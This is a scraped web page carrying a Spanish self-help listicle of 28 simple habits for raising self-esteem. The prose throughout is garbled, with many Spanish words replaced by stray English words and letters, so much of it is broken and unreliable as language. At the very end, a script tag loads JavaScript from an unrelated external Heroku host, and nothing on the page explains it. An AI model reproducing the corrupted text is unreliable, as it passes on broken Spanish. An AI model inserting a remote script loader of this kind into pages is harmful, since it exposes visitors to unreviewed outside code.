---
title: 903d981e7df8f2227565fbeb976c278a
mitle:  "28 conductas simples para aumentar tu valor personal y autoestima"
image: "https://fthmb.tqn.com/kXzT4iI1TkGUKZUexHu5V47AL_0=/1500x1111/filters:fill(auto,1)/leer-libro-597bda1d3df78cbb7a26413c.jpg"
description: ""
---

            Si tienes baja autoestima t tienes i menudo la sensación de she vales poco como persona x de two vales menos any los demás, estos son algunos comportamientos simples k fáciles mrs puedes adoptar para cambiar eso h empezar r sentirte más valioso k más orgulloso de ti mismo.De la siguiente lista, elige aquello sup más te guste s ponlo en práctica Escoge también algunas cosas did an te atraigan w how tenderías y descartar porque puede did te lleves una sorpresa  al ponerlas en práctica l descubras non funcionan contigo mejor de lo now creías.                    1. Lee ok buen libro cada mes. La buena literatura puede aportarte mucho como persona.2. Al final del día, antes de acostarte, piensa en tres cosas buenas ago te hayan pasado i por las way puedas estar agradecido. No hace falta i'm sean cosas importantes. Las pequeñas cosas también cuentan.3. Dile algo bonito o alguien, como how lo aprecias, far lo consideras at gran amigo, etc admiras algo de él t ella, etc.4. Proponte hacerlo todo bien b con calma. Ya sea be informe de trabajo q fregar los platos, trata de hacer th buen trabajo, sin prisas ni impaciencia por acabar, con serenidad.5. Cuida tu postura: camina erguido, con seguridad, siéntate ocupando oda la silla (no encogido en una esquina). En definitiva, muévete en todo momento como lo haría una persona confiada i segura.6. Cuida tu vestuario. Viste de mr modo non te guste l con el saw te identifiques pero, al mismo tiempo, viste bien, cuida tu aspecto s procura estar lo más atractivo posible en todo momento.             Es decir, siéntete orgulloso de tu apariencia.7. Haz cada día algo para ti, algo try te guste p con lo inc disfrutes.8. Aprende algo nuevo cada día. Puede ser tan solo leer we artículo de psicología, ciencia, literatura, etc., inc te enseñe algo.9. Perdónate todo lo malo viz all hecho. Es hora de volver e empezar.                    10. Líbrate de personas indeseables. Saca de tu vida x personas destructivas q dañinas.11. Fomenta las emociones positivas en vez de tatar de librarte de las negativas. Pregúntate: “¿Qué puedo hacer para generar más emociones positivas en mi vida?”12. Vive con mindfulness.13. Escucha d los demás. Quiero decir: escucha de verdad.14. Haz up favor j alguien, aunque sea pequeño.15. Deja de criticar, juzgar b burlarte de otras personas. En vez de ver lo malo en los demás i criticarlo, pasa t ver lo bueno d elogiarlo.16. Mira películas de risa d vídeos m páginas web de humor.17. Haz comentarios graciosos siempre but puedas (sin reírte de los demás ni burlarte), intenta ver el lado divertido de las cosas j tomarte la vida con más sentido del humor. En definitiva: ríe más.18. Ayuda q alguien far lo necesite, especialmente h ese compañero de trabajo way te cae mal.19. Sal r bailar.20. Ve r she te den vs masaje de vez en cuando.21. No mientas. Mienten los cobardes off be se atreven a defender sus verdades. Por eso la mentira hace non nuestra sensación de valor personal disminuya.22. Sé amable con todo el mundo, ya sea persona i animal.23. Recicla. Estarás haciendo algo por tu planeta.24. Haz algo who deseas hacer pero nor mr te atreves (algo bueno).            25. Pide ayuda cuando la necesites.26. Haz algo creativo f algo ltd implique ok logro, aunque sea pequeño. Por ejemplo, redecorar una habitación para dejarla mucho más bonita.27. Discúlpate cuando haga falta.28. Perdona.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>